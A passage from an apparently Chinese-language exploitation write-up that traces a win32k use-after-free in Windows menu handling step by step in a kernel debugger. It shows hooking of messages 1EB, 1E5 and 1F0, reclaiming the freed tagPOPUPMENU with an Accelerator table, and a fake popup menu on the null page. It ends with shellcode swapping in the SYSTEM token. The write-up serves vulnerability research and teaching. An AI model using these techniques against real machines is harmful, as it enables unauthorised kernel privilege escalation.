     ffaa6d78 size:   10 previous size:   18  (Free)       Usqm
    *ffaa6d88 size:   40 previous size:   10  (Allocated) *Uspm Process: 8637d6a8
    Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup
接下来我们开始利用钩子来完成hook过程。第一步，在FindWindowFromMessage函数调用中，处理1EB消息，这个和CVE-2014-4113很像。
    90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)
    win32k!xxxMNMouseMove+0x4d:
    9066943c f7470400800000  test    dword ptr [edi+4],8000h
    kd> r eax
    eax=fea10770
第一步钩子会返回窗口B的值，这样，也能绕过IsDestroy的判断，随后进入第二步处理，第二步处理的值，是1E5的消息，这个消息返回后会将返回值和0x10做一个判断。
    xor     edi, edi
    push    edi             ; Address
    push    dword ptr [ebp+UnicodeString] ; UnicodeString
    push    1E5h            ; MbString
    push    esi             ; P
    call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
    ; 67:           if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
    test    al, 10h
    jz      short loc_BF939583
这样我们控制钩子令返回值为0x10就可以了。
    kd> p
    win32k!xxxMNMouseMove+0x134:
    90669523 e87500f8ff      call    win32k!xxxSendMessage (905e959d)
    kd> g
    Breakpoint 16 hit
    win32k!xxxMNMouseMove+0x139:
    90669528 a810            test    al,10h
    kd> r eax
    eax=00000010
    kd> p
    win32k!xxxMNMouseMove+0x13b:
    9066952a 7457            je      win32k!xxxMNMouseMove+0x194 (90669583)
第三步处理1F0的消息，这一步很关键，会调用SendMessage，在这一步的钩子中对窗口B，也就是#32768窗口进行销毁，这样tagPopupMenu也会被释放，销毁后我们使用Accelerator再次占位，由于这一步是在一个if语句里，因此需要返回值为0，才能通过非的判断。
    .text:BF939530                 push    edi             ; Address
    .text:BF939531                 push    edi             ; UnicodeString
    .text:BF939532                 push    1F0h            ; MbString
    .text:BF939537                 push    esi             ; P
    .text:BF939538                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
    .text:BF93953D                 test    eax, eax
    .text:BF93953F                 jnz     short loc_BF939583
    .text:BF939541 ; 68:             xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置
这样的话，我们销毁窗口，并且进行占位，首先在调用SendMessage触发hook之前，我们来看一下当前tagPopupMenu对象池空间仍然是tagPopupMenu对象。
    kd> p
    win32k!xxxMNMouseMove+0x149:
    0008:919f8282 e8f5c3f8ff      call    win32k!xxxSendMessage (9198467c)
    kd> !pool ffaa6d90
    Pool page ffaa6d90 region is Paged session pool
     ffaa6000 size:  8e0 previous size:    0  (Allocated)  Gla1
     ffaa68e0 size:   50 previous size:  8e0  (Allocated)  Ustm
     ffaa6930 size:   b8 previous size:   50  (Allocated)  Uspp
     ffaa69e8 size:   b8 previous size:   b8  (Allocated)  Uspp
     ffaa6aa0 size:  158 previous size:   b8  (Allocated)  UsDI
     ffaa6bf8 size:  158 previous size:  158  (Allocated)  UsDI
     ffaa6d50 size:   10 previous size:  158  (Allocated)  Glnk
     ffaa6d60 size:   18 previous size:   10  (Allocated)  Ggls
     ffaa6d78 size:   10 previous size:   18  (Free)       Usqm
    *ffaa6d88 size:   40 previous size:   10  (Allocated) *Uspm Process: 8637d6a8
    Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup
     ffaa6dc8 size:   20 previous size:   40  (Allocated)  Ussy
     ffaa6de8 size:   18 previous size:   20  (Allocated)  Ggls
     ffaa6e00 size:   78 previous size:   18  (Allocated)  Gpfe
     ffaa6e78 size:   50 previous size:   78  (Allocated)  Ttfd
     ffaa6ec8 size:   48 previous size:   50  (Allocated)  Gffv
     ffaa6f10 size:   70 previous size:   48  (Allocated)  Ghab
     ffaa6f80 size:   10 previous size:   70  (Allocated)  Glnk
     ffaa6f90 size:   70 previous size:   10  (Allocated)  Ghab
随后，我们调用hook返回后，再次看一下tagPopupMenu对象位置
    kd> p
    win32k!xxxMNMouseMove+0x14e://tagPOPUPMENU被释放，出现40size的free空间，用Accelerator再次占位
    0008:919f8287 85c0            test    eax,eax
    kd> !pool ffaa6d90
    Pool page ffaa6d90 region is Paged session pool
     ffaa6000 size:  8e0 previous size:    0  (Allocated)  Gla1
     ffaa68e0 size:   50 previous size:  8e0  (Allocated)  Ustm
     ffaa6930 size:   b8 previous size:   50  (Allocated)  Uspp
     ffaa69e8 size:   b8 previous size:   b8  (Allocated)  Uspp
     ffaa6aa0 size:  158 previous size:   b8  (Allocated)  UsDI
     ffaa6bf8 size:  158 previous size:  158  (Allocated)  UsDI
     ffaa6d50 size:   10 previous size:  158  (Allocated)  Glnk
     ffaa6d60 size:   18 previous size:   10  (Allocated)  Ggls
     ffaa6d78 size:   10 previous size:   18  (Free)       Usqm
    *ffaa6d88 size:   40 previous size:   10  (Allocated) *Usac Process: 8637d6a8
    Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
已经被Accelerator对象占位了，这样，由于Use After
Free的原因，在进入xxxMNHideNextHierarchy函数前，没有对tagPopupMenu值是否有效进行检查，而是直接引用了tagACCEL+0xc位置的值，这个值正好是cAccel也就是我们可控的一个值，这个值，为了令pool
size大小和tagPopupMenu相同，所以这个值为0x5。
    kd> p//esi的值为占用tagPopupMenu的tagACCEL，+0xC为caccel
    win32k!xxxMNHideNextHierarchy+0x2f:
    0008:919ea12e 8b460c          mov     eax,dword ptr [esi+0Ch]
    kd> p
    win32k!xxxMNHideNextHierarchy+0x32:
    0008:919ea131 3b461c          cmp     eax,dword ptr [esi+1Ch]
    kd> p
    win32k!xxxMNHideNextHierarchy+0x35:
    0008:919ea134 740f            je      win32k!xxxMNHideNextHierarchy+0x46 (919ea145)
    kd> r eax//tagPopupMenu由于释放并占位，变成了0x5
    eax=00000005
    kd> p
    win32k!xxxMNHideNextHierarchy+0x37:
    0008:919ea136 6a00            push    0
    kd> p
    win32k!xxxMNHideNextHierarchy+0x39:
    0008:919ea138 6a00            push    0
    kd> p
    win32k!xxxMNHideNextHierarchy+0x3b:
    0008:919ea13a 68e4010000      push    1E4h
    kd> p
    win32k!xxxMNHideNextHierarchy+0x40:
    0008:919ea13f 50              push    eax
    kd> p
    win32k!xxxMNHideNextHierarchy+0x41:
    0008:919ea140 e837a5f9ff      call    win32k!xxxSendMessage (9198467c)
这样，我们就需要在0x5，也就是零页的对应的位置构造fake
popupmenu绕过内层函数的各处判断。接下来向内层继续传递，和CVE-2014-4113的利用过程就基本一致了。
    kd> p
    win32k!xxxSendMessage+0x23:
    905e95c0 e882fdffff      call    win32k!xxxSendMessageTimeout (905e9347)
    kd> dd esp
    92dd3a14  00000005 000001e4 00000000 00000000
最后，执行到shellcode
    kd> p
    win32k!xxxSendMessageTimeout+0x1a9:
    905e94f0 ff5660          call    dword ptr [esi+60h]
    kd> r esi
    esi=00000005
    kd> dd esi+60
    00000065  00371410 00000000 00000000 00000000
    kd> p
    Breakpoint 6 hit
    00371410 55              push    ebp
下一个写入断点
    kd> !process 0 0
    **** NT ACTIVE PROCESS DUMP ****
    PROCESS 841bdab0  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
        DirBase: 00185000  ObjectTable: 87c01be8  HandleCount: 490.
        Image: System
    PROCESS 845da8a8  SessionId: 1  Cid: 0ddc    Peb: 7ffdf000  ParentCid: 0cf8
        DirBase: 3f321500  ObjectTable: 95b440f0  HandleCount:  28.
        Image: EoP_1.exe
    kd> dd 845da8a8+f8
    845da9a0  86094613 000078da 00000000 00000000原进程token
shellcode进行替换
    kd> dd 845da8a8+f8 //提权Token
    845da9a0  87c01337 000078da 00000000 00000000
    kd> dd 841bdab0+f8 //系统Token
    841bdba8  87c01337 00000000 00000000 00000000
现在是system的token了，这里我在调试的时候发现，程序完成提权后，无法正确关闭窗口，这样我在WndProc中加入了一个PostMessage，传递的消息是WM_CLOSE用来关闭窗口，最后完成提权，放一个提权后的截图
这个漏洞总体来说可以算是CVE-2014-4113的进阶，和内核较劲的过程非常有意思，一步步的思考和绕过，让我想起以前膜拜大牛们过狗的案例中一步步bypass的过程，实际上二进制也是一样。
那么这篇文章也写到这里，希望大牛们多多批评指正，也希望大家也都能有所收获，谢谢！
**传送门**
* * *
[**【技术分享】经典内核漏洞调试笔记** ****](http://bobao.360.cn/learning/detail/3170.html)